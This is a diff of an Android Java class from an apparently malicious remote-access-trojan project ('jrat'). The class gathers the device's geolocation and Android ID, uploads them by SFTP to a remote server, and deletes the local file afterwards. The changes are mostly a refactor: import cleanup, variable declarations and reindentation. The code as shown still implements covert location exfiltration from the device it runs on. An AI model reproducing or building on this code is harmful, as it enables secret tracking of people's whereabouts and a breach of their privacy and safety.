@@ -3,7 +3,6 @@ package com.julioxus.jrat;
 import android.content.Context;
 import android.os.AsyncTask;
 import android.os.Environment;
-import android.util.Pair;
 
 import com.jcraft.jsch.Channel;
 import com.jcraft.jsch.ChannelSftp;
@@ -15,7 +14,6 @@ import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.OutputStream;
-import java.util.ArrayList;
 import java.util.Properties;
 
 /**
@@ -42,9 +40,9 @@ public class SendGeoLocationAsyncTask extends AsyncTask<Context, Void, String> {
     protected String doInBackground(Context...params) {
 
         // Connection variables
-        JSch jsch = null;
+        JSch jsch;
+        Channel channel;
         Session session = null;
-        Channel channel = null;
         ChannelSftp c = null;
 
         String username = "jrat";
@@ -73,7 +71,7 @@ public class SendGeoLocationAsyncTask extends AsyncTask<Context, Void, String> {
         }
 
         // Create a file with the geolocation to send to the remote server
-        File file = new File(Environment.getExternalStorageDirectory() + File.separator + android_id+"-geolocation"+".txt");
+        File file = new File(Environment.getExternalStorageDirectory() + File.separator + android_id+"-geolocation.txt");
         try {
             file.createNewFile();
         } catch (IOException e) {
@@ -101,30 +99,31 @@ public class SendGeoLocationAsyncTask extends AsyncTask<Context, Void, String> {
             }
 
         }
-            // Close file
-            try {
-                fo.close();
-            } catch (IOException e1) {
-                e1.printStackTrace();
-            }
-
-            // Send file to server
-            try {
-                System.out.println("Starting File Upload:");
-                String fsrc = file.getPath(), fdest = android_id+"-geolocation"+".txt";
-                c.put(fsrc, fdest);
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-
-            // Close connection
-            c.disconnect();
-            session.disconnect();
-
-            // Delete the temporary file
-            file.delete();
-            System.out.println("file deleted");
-
-            return null;
+        // Close file
+        try {
+            fo.close();
+        } catch (IOException e1) {
+            e1.printStackTrace();
         }
+
+        // Send file to server
+        try {
+            String fsrc = file.getPath();
+            String fdest = android_id+"-geolocation.txt";
+
+            c.put(fsrc, fdest);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        // Close connection
+        c.disconnect();
+        session.disconnect();
+
+        // Delete the temporary file
+        file.delete();
+        System.out.println("file deleted");
+
+        return null;
     }
+}
